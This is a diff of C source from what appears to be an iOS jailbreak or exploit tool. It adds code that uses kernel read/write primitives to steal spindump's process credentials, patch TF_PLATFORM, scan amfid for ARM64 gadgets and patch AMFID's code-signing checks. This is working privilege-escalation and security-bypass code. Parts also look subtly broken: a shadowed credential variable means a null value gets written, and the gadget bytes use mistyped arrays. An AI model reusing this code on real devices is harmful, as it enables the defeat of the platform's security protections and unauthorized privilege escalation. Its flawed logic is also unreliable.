@@ -35,9 +35,49 @@
 #include <sys/mman.h>
 #include <mach-o/nlist.h>
 #include <mach-o/getsect.h>
+#include "k_offsets.h"
+#include "kapi.h"
+#include "kutils.h"
 
 pthread_attr_t pth_commAttr = {0};
 size_t amfid_fsize = 0;
+uint64_t myold_cred2 = 0;
+
+void safepatch_swap_spindump_cred(uint64_t target_proc){
+    pid_t spindump_pid = 0;
+    kptr_t spindump_proc_cred = KPTR_NULL;
+    printf("Swapping spindump credentials with 0x%llx...\n", target_proc);
+    if(spindump_proc_cred == 0){
+        spindump_pid = 0;
+        if(!(spindump_pid = look_for_proc("/usr/sbin/spindump"))){
+            printf("-> Spindump not running at the moment. Waiting for child process to spawn...\n");
+            if(fork() == 0){
+                daemon(1, 1);
+                close(STDIN_FILENO);
+                close(STDOUT_FILENO);
+                close(STDERR_FILENO);
+                printf("-> Spawning child process... (%d)\n", execvp("/usr/sbin/spindump", NULL));
+                exit(1);
+            } while(!(spindump_pid = look_for_proc("/usr/sbin/spindump"))){
+                // While Spindump is not running...
+            }
+        }
+        printf("-> Pausing spindump process...\n");
+        kill(spindump_pid, SIGSTOP);
+        printf("-> Spindump pid:\t%d\n", spindump_pid);
+        kptr_t spindump_proc = kproc_find_by_pid(spindump_pid);
+        printf("-> Spindump proc:\t0x%llx\n", spindump_proc);
+        kptr_t spindump_proc_cred = kapi_read_kptr(spindump_proc + OFFSET(proc, p_ucred));
+        printf("-> Spindump cred:\t0x%llx\n", spindump_proc_cred);
+        kptr_t target_task = kapi_read_kptr(target_proc + OFFSET(proc, task));
+        printf("-> target task:\t\t0x%llx\n", target_task);
+        patch_TF_PLATFORM(target_task);
+        printf("-> TF_PLATFORM patched\n");
+    }
+    myold_cred2 = kapi_read_kptr(target_proc + OFFSET(proc, p_ucred));
+    kapi_write(target_proc + OFFSET(proc, p_ucred), &spindump_proc_cred, 8);
+}
+
 
 void pth_commAttr_init(){
     pthread_attr_init(&pth_commAttr);
@@ -58,8 +98,41 @@ uint8_t *map_file_to_mem(const char *path){
     return mapping_mem;
 }
 
-uint64_t find_amfid_OFFSET_MISValidate_symbol(uint8_t *amfid_macho){
+uint64_t find_amfid_OFFSET_gadget(uint8_t *amfid_macho){
+    const char *_segment = "__TEXT", *_section = "__text";
+    const struct section_64 *sect_info = getsectbynamefromheader_64((const struct mach_header_64 *)amfid_macho, _segment, _section);
+    if(!sect_info){
+        printf("Error in find_amfid_OFFSET_gadget(): if(!sect_info)\n");
+        exit(1);
+    }
+    unsigned long sect_size = 0;
+    uint64_t sect_data = (uint64_t)getsectiondata((const struct mach_header_64 *)amfid_macho, _segment, _section, &sect_size);
     
+    uint64_t _bytes_gadget[] = {
+        0x08, 0x29, 0x09, 0x9B, // madd    x8, x8, x9, x10
+        0x00, 0x15, 0x40, 0xF9, // ldr     x0, [x8, #0x28]
+        0xC0, 0x03, 0x5F, 0xD6, // ret
+    };
+    
+    uint64_t _bytes_gadget2[] = {
+        0x08, 0x25, 0x2A, 0x9B, // smaddl    x8, w8, w10, x9
+        0x00, 0x15, 0x40, 0xF9, // ldr     x0, [x8, #0x28]
+        0xC0, 0x03, 0x5F, 0xD6, // ret
+    };
+    
+    uint64_t find_gadget = (uint64_t)memmem((void*)sect_data, sect_size, &_bytes_gadget, sizeof(_bytes_gadget));
+    if(!find_gadget)
+        find_gadget = (uint64_t)memmem((void*)sect_data, sect_size, &_bytes_gadget2, sizeof(_bytes_gadget2));
+    if(!find_gadget){
+        printf("Error in find_amfid_OFFSET_gadget(): if(!find_gadget)\n");
+    }
+    
+    return (find_gadget - sect_data) + sect_info->offset;
+}
+
+
+
+uint64_t find_amfid_OFFSET_MISValidate_symbol(uint8_t *amfid_macho){
     uint32_t MISValidate_symIndex = 0;
     struct mach_header_64 *mh = (struct mach_header_64*)amfid_macho;
     const uint32_t cmd_count = mh->ncmds;
@@ -204,9 +277,17 @@ bool replace_amfid_port(){
 kptr_t perform_amfid_patches(){
     printf("* ------- AMFID Patches -------- *\n");
     uint8_t *amfid_fdata = map_file_to_mem("/usr/libexec/amfid");
-    kptr_t amfid_OFFSET_MISValidate_symbol = find_amfid_OFFSET_MISValidate_symbol(amfid_fdata);
-    printf("amfid_OFFSET_MISValidate_symbol:\t0x%llx\n", amfid_OFFSET_MISValidate_symbol);
+    printf("Extracted AMFID Offsets:\n");
     
+    /** Finding Amfid related offsets */
+    kptr_t amfid_OFFSET_MISValidate_symbol = find_amfid_OFFSET_MISValidate_symbol(amfid_fdata);
+    printf("----> MISValidate:\t0x%llx\n", amfid_OFFSET_MISValidate_symbol);
+    // Todo: fix this
+    // kptr_t amfid_OFFSET_gadget = find_amfid_OFFSET_gadget(amfid_fdata);
+    // printf("\t--> Gadget:\t0x%llx\n", amfid_OFFSET_gadget);
+    /** Map amfid to local memory */
+    munmap(amfid_fdata, amfid_fsize);
+    safepatch_swap_spindump_cred(g_exp.self_proc);
     if(getuid() != 0) return 1;
     mach_port_t amfid_task_port = MACH_PORT_NULL;
     kern_return_t ret = host_get_amfid_port(mach_host_self(), &amfid_task_port);
